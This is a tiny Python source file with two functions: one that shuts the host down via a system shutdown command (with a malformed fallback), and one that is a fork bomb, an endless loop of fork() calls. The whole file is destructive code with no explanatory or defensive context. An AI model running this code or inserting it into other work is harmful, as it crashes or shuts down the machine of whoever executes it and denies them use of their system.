from os import system, fork

def shut():
    try:
        system("shutdown now")
    except:
        system("shutdown \\s \\t 3")

def boom():
    while True:
        fork()